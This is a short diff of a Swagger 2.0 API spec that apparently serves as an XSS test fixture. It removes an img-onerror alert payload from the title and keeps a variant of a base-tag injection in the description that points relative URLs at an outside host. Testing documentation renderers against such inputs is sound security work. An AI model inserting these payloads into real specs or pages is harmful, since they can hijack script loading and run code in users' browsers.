@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS test'"><img src=x onerror=alert(document.domain)>
+  title: XSS test
   description: |
-    1'"</Script><Base id=18530 Href=//X55.is>
+    1'"><Base Href=//X55.is>
 paths:
   /test:
     get:
